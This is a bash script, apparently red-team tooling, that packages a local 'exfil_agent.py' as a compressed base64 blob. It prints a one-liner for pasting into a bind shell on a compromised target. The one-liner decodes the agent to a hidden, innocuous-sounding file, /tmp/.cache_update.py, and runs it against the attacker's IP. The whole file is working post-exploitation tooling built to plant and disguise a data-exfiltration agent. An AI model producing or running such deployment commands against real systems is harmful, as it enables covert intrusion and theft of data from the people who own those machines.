#!/bin/bash
# ============================================
# Red Team - Deploy Exfil Agent to Target
# Generates the base64 command to paste into bind shell
# ============================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
AGENT_FILE="${SCRIPT_DIR}/exfil_agent.py"
ATTACKER_IP="${1:?Usage: ./deploy_agent.sh <ATTACKER_IP>}"

if [ ! -f "$AGENT_FILE" ]; then
    echo "[X] $AGENT_FILE not found"
    exit 1
fi

B64=$(gzip -c "$AGENT_FILE" | base64 -w0)

echo "[*] Deploy command generated. Paste this into the bind shell:"
echo ""
echo "echo '${B64}' | base64 -d | gunzip > /tmp/.cache_update.py && python3 /tmp/.cache_update.py ${ATTACKER_IP}"
echo ""
echo "[*] Agent size: $(wc -c < "$AGENT_FILE") bytes"
echo "[*] Compressed base64 size: ${#B64} chars"
